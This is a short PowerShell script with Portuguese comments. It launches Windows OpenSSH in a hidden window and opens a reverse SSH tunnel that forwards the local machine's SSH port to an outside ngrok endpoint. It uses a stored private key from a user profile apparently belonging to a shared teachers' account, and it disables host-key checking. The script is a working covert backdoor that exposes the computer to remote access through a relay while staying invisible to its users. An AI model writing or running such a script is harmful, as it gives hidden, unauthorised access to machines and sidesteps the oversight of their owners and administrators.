# Caminho do SSH
$sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"

# Caminho da chave privada
$keyPath = "C:\Users\Professores 2\.ssh\ssh_key"

# Argumentos da conexão SSH
$arguments = "-i `"$keyPath`" -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 3333:localhost:22 u0_a434@0.tcp.sa.ngrok.io -p 11589 -N -vvv"

# Executa o SSH de forma invisível
Start-Process -FilePath $sshPath -ArgumentList $arguments -WindowStyle Hidden
